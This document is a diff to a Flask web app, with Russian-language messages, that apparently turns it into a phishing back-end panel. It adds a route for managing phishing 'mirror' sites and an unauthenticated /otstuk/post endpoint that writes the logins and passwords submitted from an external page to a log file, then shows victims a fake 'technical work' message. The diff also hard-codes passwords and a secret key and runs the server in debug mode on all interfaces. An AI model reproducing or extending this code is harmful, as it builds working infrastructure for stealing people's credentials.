@@ -9,6 +9,9 @@ app = Flask(__name__)
 app.secret_key = "super-secret-key-12345"
 
 UPLOAD_FOLDER = "uploads"
+SITES_FILE = "sites.txt"
+LOGS_FILE = "otstuk_logs.txt"  # новый файл для логов отстука
+
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
 login_manager = LoginManager()
@@ -22,8 +25,8 @@ class User(UserMixin):
         self.role = role
 
 users = {
-    "admin": {"password": generate_password_hash("admin1233422"), "id": "1", "role": "admin"},
-    "fisher1337":  {"password": generate_password_hash("fisher943992@28438438"), "id": "2", "role": "OWNER"}
+    "admin": {"password": generate_password_hash("admin123@fdfdfdfdfd"), "id": "1", "role": "admin"},
+    "fisher1337":  {"password": generate_password_hash("fisher9939DJ3sss@"), "id": "2", "role": "user"}
 }
 
 @login_manager.user_loader
@@ -33,6 +36,19 @@ def load_user(user_id):
             return User(user_id, username, data["role"])
     return None
 
+def load_sites():
+    if not os.path.exists(SITES_FILE):
+        return []
+    with open(SITES_FILE, "r", encoding="utf-8") as f:
+        return [{"name": line.split("|")[0].strip(), "url": line.split("|")[1].strip()} 
+                for line in f if "|" in line]
+
+def load_otstuk_logs():
+    if not os.path.exists(LOGS_FILE):
+        return []
+    with open(LOGS_FILE, "r", encoding="utf-8") as f:
+        return [line.strip() for line in f if line.strip()]
+
 @app.route('/login', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
@@ -40,8 +56,7 @@ def login():
         password = request.form.get('password')
         user_data = users.get(username)
         if user_data and check_password_hash(user_data['password'], password):
-            user = User(user_data['id'], username, user_data['role'])
-            login_user(user)
+            login_user(User(user_data['id'], username, user_data['role']))
             return redirect(url_for('dashboard'))
         flash('Неверный логин или пароль', 'danger')
     return render_template('login.html')
@@ -67,26 +82,58 @@ def dashboard():
                 'upload_time_short': datetime.fromtimestamp(mtime).strftime('%d.%m %H:%M')
             })
     files.sort(key=lambda x: x['upload_time_short'], reverse=True)
-    
     is_admin = getattr(current_user, 'role', None) == 'admin'
-    
-    return render_template('dashboard.html', files=files, is_admin=is_admin)
+    return render_template('dashboard.html', files=files, is_admin=is_admin, active='files')
 
+@app.route('/sites')
+@login_required
+def sites():
+    sites_list = load_sites()
+    is_admin = getattr(current_user, 'role', None) == 'admin'
+    return render_template('sites.html', sites=sites_list, is_admin=is_admin, active='sites')
+
+@app.route('/status')
+@login_required
+def status():
+    is_admin = getattr(current_user, 'role', None) == 'admin'
+    file_count = len([f for f in os.listdir(UPLOAD_FOLDER) if os.path.isfile(os.path.join(UPLOAD_FOLDER, f))])
+    return render_template('status.html', 
+                         is_admin=is_admin, 
+                         active='status',
+                         file_count=file_count,
+                         sites_count=len(load_sites()),
+                         server_time=datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
+
+@app.route('/otstuk')
+@login_required
+def otstuk():
+    logs = load_otstuk_logs()
+    is_admin = getattr(current_user, 'role', None) == 'admin'
+    return render_template('otstuk.html', logs=logs, is_admin=is_admin, active='otstuk')
+
+# Новый маршрут для приёма данных с внешней страницы
+@app.route('/otstuk/post', methods=['POST'])
+def otstuk_post():
+    login = request.form.get('login', '')
+    password = request.form.get('password', '')
+    if login or password:
+        with open(LOGS_FILE, "a", encoding="utf-8") as f:
+            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            f.write(f"[{timestamp}] Логин: {login} | Пароль: {password}\n")
+    return "Ведутся технические работы", 200
+
+# Остальные маршруты
 @app.route('/upload', methods=['POST'])
 @login_required
 def upload_file():
     if getattr(current_user, 'role', None) != 'admin':
         flash('Нет прав на загрузку файлов', 'danger')
         return redirect(url_for('dashboard'))
-    
     file = request.files.get('file')
-    if not file or not file.filename:
-        flash('Файл не выбран', 'danger')
-        return redirect(url_for('dashboard'))
-    
-    filename = secure_filename(file.filename)
-    file.save(os.path.join(UPLOAD_FOLDER, filename))
-    flash('Файл успешно загружен!', 'success')
+    if file and file.filename:
+        filename = secure_filename(file.filename)
+        file.save(os.path.join(UPLOAD_FOLDER, filename))
+        flash('Файл успешно загружен!', 'success')
     return redirect(url_for('dashboard'))
 
 @app.route('/download/<filename>')
@@ -98,14 +145,45 @@ def download_file(filename):
 @login_required
 def delete_file(filename):
     if getattr(current_user, 'role', None) != 'admin':
-        flash('Нет прав на удаление', 'danger')
+        flash('Нет прав', 'danger')
         return redirect(url_for('dashboard'))
     try:
         os.remove(os.path.join(UPLOAD_FOLDER, filename))
         flash('Файл удалён', 'success')
     except:
-        flash('Ошибка удаления файла', 'danger')
+        flash('Ошибка удаления', 'danger')
     return redirect(url_for('dashboard'))
+
+@app.route('/add_site', methods=['POST'])
+@login_required
+def add_site():
+    if getattr(current_user, 'role', None) != 'admin':
+        flash('Нет прав', 'danger')
+        return redirect(url_for('sites'))
+    name = request.form.get('name', '').strip()
+    url = request.form.get('url', '').strip()
+    if name and url:
+        with open(SITES_FILE, "a", encoding="utf-8") as f:
+            f.write(f"{name}|{url}\n")
+        flash('Зеркало добавлено!', 'success')
+    else:
+        flash('Заполните все поля', 'danger')
+    return redirect(url_for('sites'))
+
+@app.route('/delete_site/<int:index>')
+@login_required
+def delete_site_route(index):
+    if getattr(current_user, 'role', None) != 'admin':
+        flash('Нет прав', 'danger')
+        return redirect(url_for('sites'))
+    sites = load_sites()
+    if 0 <= index < len(sites):
+        del sites[index]
+        with open(SITES_FILE, "w", encoding="utf-8") as f:
+            for s in sites:
+                f.write(f"{s['name']}|{s['url']}\n")
+        flash('Зеркало удалено', 'success')
+    return redirect(url_for('sites'))
 
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0', port=5000)
